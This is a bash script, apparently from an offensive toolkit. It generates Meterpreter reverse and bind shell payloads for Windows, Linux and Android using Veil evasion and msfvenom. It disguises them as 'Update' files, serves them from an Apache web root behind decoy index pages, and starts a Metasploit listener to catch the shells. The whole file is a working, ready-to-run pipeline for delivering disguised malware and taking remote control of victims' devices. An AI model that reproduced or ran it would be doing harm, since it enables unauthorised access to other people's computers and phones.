#!/bin/bash
#Colors
b="\033[33m"
g="\033[32m"
r="\033[31m"
w="\033[00m"
#Colors
ip=$(hostname -I)
done=$(echo -e "$g Successfully created the payload.$w \nPATH= /var/www/html/ \nIP= $ip\nPORT= 4444\nGlHf for now.")

echo "Choose your platform :"
echo -e "$g 0.$w Skip the payload creation."
echo -e "$g 1.$w Windows"
echo -e "$g 2.$w Linux"
echo -e "$g 3.$w Android"
echo -ne "Choice : $g"
read resp1
echo -e "$w"

#Windows
if [ $resp1 = 1 ]; then
  clear
  echo -e "$g 1.$w Updateshell - Reverse_TCP"
  echo -ne "Choice : $g"
  read resp2
  echo -e "$w"
#Linux
elif [ $resp1 = 2 ]; then
  clear
  echo -e "$g 1.$w Python - Reverse_TCP"
  echo -e "$g 2.$w Ruby - Reverse_TCP"
  echo -ne "Choice : $g"
  read resp2
  echo -e "$w"
#Android
elif [ $resp1 = 3 ]; then
  clear
  echo -e "$g 1.$w Meterpreter - Reverse_TCP"
  echo -e "$g 2.$w Meterpreter - Bind_TCP"
  echo -ne "Choice : $g"
  read resp2
  echo -e "$w"
else
  echo -e "$r error.$w"
fi

#Skiping payload creation
if [ $resp1 = 0 ]; then
echo -e "$g Skipping the payload creation...$w"
paychoice=0
#Windows - Updateshell - Reverse_tcp
elif [ $resp1 = 1 ] && [ $resp2 = 1 ]; then
  clear
  echo -e "$g Creating payload...$w"
  cd ../res/Veil/
  rm -r /var/lib/veil/output/source
  mkdir /var/lib/veil/output/source
  ./Veil.py -t evasion -p Updateshell/meterpreter/rev_tcp.py --ip $(hostname -I) --port 4444 -o Update
  mv /var/lib/veil/output/source/Update.bat /var/www/html/
  echo "$done"
  paychoice=11
#Linux - Python - Reverse_TCP
elif [ $resp1 = 2 ] && [ $resp2 = 1 ]; then
  clear
  echo -e "$g Creating payload...$w"
  cd ../res/Veil/
  rm -r /var/lib/veil/output/source
  mkdir /var/lib/veil/output/source
  ./Veil.py -t evasion -p python/meterpreter/rev_tcp.py --ip $(hostname -I) --port 4444 -o Update
  mv /var/lib/veil/output/source/Update.py /var/www/html/
  echo "$done"
  paychoice=21
#Linux - Ruby - Bind_TCP
elif [ $resp1 = 2 ] && [ $resp2 = 2 ]; then
  clear
  echo -e "$g Creating payload...$w"
  cd ../res/Veil/
  rm -r /var/lib/veil/output/source
  mkdir /var/lib/veil/output/source
  ./Veil.py -t evasion -p ruby/meterpreter/rev_tcp.py --ip $(hostname -I) --port 4444 -o Update
  mv /var/lib/veil/output/source/Update.rb /var/www/html/
  echo "$done"
  paychoice=22
#Android - Meterpreter - Reverse_TCP
elif [ $resp1 = 3 ] && [ $resp2 = 1 ]; then
  clear
  cd ../res/Veil/
  echo -e "$g Creating payload...$w"
  msfvenom -p android/meterpreter/reverse_tcp LHOST=$(hostname -I) LPORT=4444 > /var/www/html/Update.apk
  echo "$done"
  paychoice=31
#Android - Meterpreter - Bind_TCP
elif [ $resp1 = 3 ] && [ $resp2 = 2 ]; then
  clear
  cd ../res/Veil/
  echo -e "$g Creating payload...$w"
  msfvenom -p android/meterpreter/bind_tcp RHOST=$(hostname -I) LPORT=4444 > /var/www/html/Update.apk
  echo "$done"
  paychoice=32
else
  echo -e "$r error.$w"
fi

echo -e "$b CHMODing the payload.$w"
chmod 777 -R /var/www/html/
echo -e "$b Starting Apache2 service...$w"
service apache2 restart
echo -e "$b Apache2 successfuly restarted.$w"
#service apache2 status

echo -e "$g Starting the listener.. (this may take a while..)$w"
cd ../../src/rb
if [ "$paychoice" = "0" ]; then
  exit 1
elif [ "$paychoice" = "11" ]; then
  cp ../html_indexes/index_windows_BAT.html /var/www/html/index.html
  cd windows
  msfconsole -r ListenWindowsUpdateRevTCP.rb
elif [ "$paychoice" = "21" ]; then
  cp ../html_indexes/index_linux_PY.html /var/www/html/index.html
  cd linux
  msfconsole -r ListenLinuxShellRevTCP.rb
elif [ "$paychoice" = "22" ]; then
  cp ../html_indexes/index_linux_RB.html /var/www/html/index.html
  cd linux
  msfconsole -r ListenLinuxShellBindTCP.rb
elif [ "$paychoice" = "31" ]; then
  cp ../html_indexes/index_android_APK.html /var/www/html/index.html
  cd android
  msfconsole -r ListenAndroRevTCP.rb
elif [ "$paychoice" = "32" ]; then
  cp ../html_indexes/index_android_APK_BIND.html /var/www/html/index.html
  cd android
  msfconsole -r ListenAndroBindTCP.rb
fi